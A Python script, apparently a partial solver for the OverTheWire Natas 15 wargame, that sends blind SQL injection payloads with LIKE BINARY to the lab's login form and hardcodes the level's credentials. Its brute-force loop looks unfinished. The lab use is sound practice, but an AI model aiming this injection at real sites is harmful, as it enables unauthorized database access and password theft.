"""sql injection functions here."""
import requests
from bs4 import BeautifulSoup


class Sql:
    """Place Sql injection functions here."""

    def __init__(self, url, data=None):
        """Construct Class."""
        self.url = url
        self.data = data
        self.response = " "
        self.objects = []

    def getReq(self, data=None, json=None, files=None, allow_redirects=True,
               username=None, password=None, cert=None, cookies=None,
               headers=None, proxies=None, stream=False, timeout=None,
               verify=True):
        """Get get response from webpage."""
        r = requests.get(self.url, data=data, json=json, files=files,
                         allow_redirects=allow_redirects,
                         auth=(username, password), cert=cert, cookies=cookies,
                         headers=headers, proxies=proxies, stream=stream,
                         timeout=timeout, verify=verify)
        self.saveResponse(r)

    def postReq(self, data=None, json=None, files=None, allow_redirects=True,
                username=None, password=None, cert=None, cookies=None,
                headers=None, proxies=None, stream=False, timeout=None,
                verify=True):
        """Get post response from webpage."""
        r = requests.post(self.url, data=data, json=json, files=files,
                          allow_redirects=allow_redirects,
                          auth=(username, password), cert=cert,
                          cookies=cookies, headers=headers, proxies=proxies,
                          stream=stream, timeout=timeout, verify=verify)
        self.saveResponse(r)

    def postPayload(self):
        """Get default response from webpage."""
        r = requests.post(self.url, self.data)
        self.saveResponse(r)

    def postPayloadAuth(self, username, password):
        """Get default response from webpage that requires auth."""
        r = requests.post(self.url, data=self.data, auth=(username, password))
        self.saveResponse(r)

    def parsePage(self):
        """Parse page elements into obejcts."""
        self.objects = BeautifulSoup(self.response.text, 'html.parser')

    def saveResponse(self, r):
        """Save response into object attributes."""
        self.response = r
        self.parsePage()


def bruteForce(url, prefix, sufix, data, length, condition=None, contains=None,
               username=None, password=None):
    """Brute Force attack."""
    print("Atk No", "Code", "data")
    for i in range(length):
        data = i
        attack = Sql(url, data)
        payload = {'username': prefix+str(data)+sufix}
        attack.postReq(data=payload, username=username, password=password)
        print(i, attack.response, data)


def main():
    """Test Above stuff here."""
    url = "http://natas15.natas.labs.overthewire.org"
    # data= {'username': 'natas16" and password LIKE BINARY "%' + 'a' + '%" #'}
    data = " "
    # test = Sql(url, data)
    prefix = 'natas16" and password LIKE BINARY "%'
    suffix = '%" #'
    password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
    bruteForce(url, prefix, suffix, data, 5, username='natas15',
               password=password)
    # test.getReq(username="natas15", password=password, data=data)
    # print(test.response)
    # print(test.response.text)
    # inputs = test.objects.find_all('input')
    # for i in inputs:
    #     if i.get('type') != 'submit':
    #         print(i)
    # form = test.response.text.find("<form")
    # formend = test.response.text.find("</form>")
    # if(form > -1):
    #     print(test.response.text[form:(formend+7)])


main()
